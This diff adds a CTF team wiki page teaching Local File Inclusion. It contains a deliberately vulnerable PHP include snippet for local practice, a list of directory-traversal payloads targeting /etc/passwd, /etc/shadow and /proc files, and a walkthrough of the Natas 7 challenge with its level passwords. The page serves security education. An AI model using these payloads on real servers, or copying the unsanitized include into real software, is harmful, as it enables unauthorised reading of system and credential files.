@@ -1,0 +1,166 @@
+<!DOCTYPE HTML>
+<!--
+	Binary by TEMPLATED
+	templated.co @templatedco
+	Released for free under the Creative Commons Attribution 3.0 license (templated.co/license)
+-->
+<html>
+	<head>
+		<title>Wiki - Web security</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+		<link rel="stylesheet" href="assets/css/main.css" />
+		<link rel="icon" type="image/png" href="images/bi0s-favicon.png" />
+	</head>
+	<body>
+
+		<!-- Header -->
+			<header id="header">
+				<a href="index.html" class="logo"><strong>bi0s-Wiki</strong> : Web exploitation</a>
+				<nav>
+					<a href="#menu">Menu</a>
+				</nav>
+			</header>
+
+		<!-- Nav -->
+		<nav id="menu">
+			<ul class="links">
+				<li><a href="index.html">Home</a></li>
+				<li><a href="web.html">Web security</a></li>
+				<li><a href="cryptography.html">Cryptography</a></li>
+                <li><a href="reverse engineering.html">Reverse engineering</a></li>
+                <li><a href="binary.html">Binary exploitation</a></li>
+				<li><a href="forensics.html">Forensics</a></li>
+				<li><a href="android.html">Android</a></li>
+			</ul>
+		</nav>
+
+		<!-- Main -->
+			<section id="main">
+				<div class="inner">
+					<div class="image fit">
+						<img src="images/websecurity2.jpg" alt="" />
+					</div>
+					<header>
+
+		<!-- matter starts -->
+						<!--<h1>Web exploitation</h1>-->
+						<!--<p class="info">3 days ago by <a href="#">Jane Doe</a></p>-->
+					</header>
+					<h1 id="localfileinclusion">Local File Inclusion</h1>
+
+<h3 id="owasp">OWASP :</h3>
+
+<h4 id="localfileinclusionalsoknownaslfiistheprocessofincludingfilesthatarealreadylocallypresentontheserverthroughtheexploitingofvulnerableinclusionproceduresimplementedintheapplicationthisvulnerabilityoccursforexamplewhenapagereceivesasinputthepathtothefilethathastobeincludedandthisinputisnotproperlysanitizedallowingdirectorytraversalcharacterssuchasdotdotslashtobeinjectedalthoughmostexamplespointtovulnerablephpscriptsweshouldkeepinmindthatitisalsocommoninothertechnologiessuchasjspaspandothers">Local File Inclusion (also known as LFI) is the process of including files, that are already locally present on the server, through the exploiting of vulnerable inclusion procedures implemented in the application. This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing directory traversal characters (such as dot-dot-slash) to be injected. Although most examples point to vulnerable PHP scripts, we should keep in mind that it is also common in other technologies such as JSP, ASP and others.</h4>
+
+<h3 id="vulnerableurlhttpwwwvulnerable_sitecompreviewphpfileexamplehtml">Vulnerable url : http://www.vulnerable_site.com/preview.php?file=example.html</h3>
+
+<p>We can test the vulnerability by changing the file to some other we one that we are interested in.</p>
+
+<h2 id="exploreityourself">Explore it yourself :</h2>
+
+<p>Try to explore the vulnerability. Make the following php file, place it in your localhost to do the testing.</p>
+
+<pre><code class="php language-php">&lt;?php
+   $file = $_GET['file'];
+   if(isset($file))
+   {
+       include("pages/$file");
+   }
+?&gt;
+</code></pre>
+
+<p>Make use of some of the given payloads. The URL looks like</p>
+
+<h2 id="somepayloads">Somepayloads :</h2>
+
+<ul>
+<li>../../../../etc/passwd/etc/issue</li>
+
+<li>../../../../etc/passwd</li>
+
+<li>../../../../etc/passwd/etc/shadow</li>
+
+<li>../../../../etc/passwd/etc/group</li>
+
+<li>../../../../etc/passwd/etc/hosts</li>
+
+<li>../../../../etc/passwd/etc/motd</li>
+
+<li>../../../../etc/passwd/etc/mysql/my.cnf</li>
+
+<li>../../../../proc/self/environ</li>
+
+<li>../../../../proc/version</li>
+
+<li>../../../../proc/cmdline</li>
+
+<li>../../../../proc/sched_debug</li>
+
+<li>../../../../proc/mounts</li>
+
+<li>../../../../proc/net/arp</li>
+
+<li>../../../../proc/net/route</li>
+
+<li>../../../../proc/net/tcp</li>
+
+<li>../../../../proc/net/udp</li>
+</ul>
+
+<h1 id="letstryachallenge">Let's try a challenge</h1>
+
+<p>### NATAS 7 :</p>
+
+<ul>
+<li>#### USERNAME : natas7</li>
+
+<li>#### PASSWORD : 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+<img src="images/natas7.1.png" alt="natas7" /></li>
+</ul>
+
+<p>The site is very simple only with two buttons, but once when you click on Home or About the URL changes as follows :</p>
+
+<p><img src="images/natas7.2.png" alt="natas7" /></br>
+  <img src="images/natas7.3.png" alt="natas7" /></p>
+
+<p>It looks like the PHP file is including the file given as page, when we check the source code we get the hint as <br />
+  #### hint: password for webuser natas8 is in /etc/natas_webpass/
+  <img src="images/natas7.4.png" alt="natas7" /></p>
+
+<p>So, let's try to include that file in the URL 
+  #### URL : index.php?page=/etc/natas_webpass/natas8
+On including this file we get the password for the next level on the screen </br></br>
+password : DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</br></br>
+<img src="images/natas7.5.png" alt="natas7" />
+</br></br></p>
+
+<h2 id="thisisabasicexampleoflocalfileinclusionvulnerability">This is a basic example of Local file inclusion vulnerability.</h2>
+
+
+<!-- Matter ends -->
+				</div>
+			</section>
+
+		<!-- Footer -->
+			<footer id="footer">
+				<ul class="icons">
+					<li><a href="#" class="icon fa-twitter"><span class="label">Twitter</span></a></li>
+					<li><a href="#" class="icon fa-facebook"><span class="label">Facebook</span></a></li>
+					<li><a href="https://www.instagram.com/teambi0s/" class="icon fa-instagram"><span class="label">Instagram</span></a></li>
+					<li><a href="bi0s.in" style="font-size:2em">bi0s.in</a></li>
+				</ul>
+				<div class="copyright">
+					&copy; Untitled. Design: <a href="https://templated.co">TEMPLATED</a>. Images: <a href="https://unsplash.com">Unsplash</a>.
+				</div>
+			</footer>
+
+		<!-- Scripts -->
+			<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/jquery.scrolly.min.js"></script>
+			<script src="assets/js/skel.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<script src="assets/js/main.js"></script>
+
+	</body>
+</html>
